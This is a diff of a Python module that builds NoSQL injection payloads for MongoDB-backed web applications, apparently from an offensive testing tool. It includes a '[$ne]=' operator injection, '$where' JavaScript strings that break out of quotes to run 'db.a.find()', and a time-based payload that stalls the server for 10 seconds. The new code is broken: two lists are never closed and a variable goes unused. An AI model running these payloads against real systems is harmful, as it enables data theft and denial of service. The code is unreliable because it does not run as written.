@@ -20,20 +20,35 @@ def randInjString(size, formatStringString):
 
 #TODO: test with strings is only made with '. It would be good to test all 4 possibilities, ' ' | ' " | " ' | " "
 
+combinations = [1,2,3,4]
+
 def createNeqString(size, formatStringString):
     return "[$ne]="+randInjString(size, formatStringString)
 
 def createWhereStrString():
-    return "=a'; return db.a.find(); var dummy='!"
+    leftPart = [
+        "=a\';",
+        "=a\";",
+        "=1;"
 
-def createWhereIntString():
-    return "=1; return db.a.find(); var dummy=1"
+    rightPart = [
+        "var d=\"a",
+        "var d=\'a",
+        "var d=1"
 
-def createWhereOneStrString():
-    return "=a'; return db.a.findOne(); var dummy='!"
+    informations = [
+        "return db.a.find();",
+        "return db.a.findOne();",
+    ]
 
-def createWhereOneIntString():
-    return "=a; return db.a.findOne(); var dummy=1"
+    for st in itertools.product(leftPart, informations, rightPart):
+        yield st
+
+#def createWhereOneStrString():
+#    return "=1; return db.a.findOne(); var dummy='!"
+
+#def createWhereOneIntString():
+#    return "=a'; return db.a.findOne(); var dummy=1"
 
 def createTimeStrString():
     return "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!"
